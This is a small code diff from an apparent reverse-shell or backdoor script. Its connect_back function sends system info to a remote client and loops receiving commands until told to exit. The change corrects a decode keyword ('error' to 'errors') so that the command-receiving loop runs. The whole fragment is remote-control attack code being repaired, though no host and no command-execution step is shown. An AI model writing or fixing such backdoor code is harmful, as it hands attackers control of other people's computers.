@@ -28,7 +28,7 @@ def connect_back():
             client.send(info.encode() + b"\n")
 
             while True:
-                cmd = client.recv(4096).decode("utf-8", error="ignore").strip()
+                cmd = client.recv(4096).decode("utf-8", errors="ignore").strip()
                 if not cmd:
                     break
                 if cmd.lower() in ["exit", "quit"]:
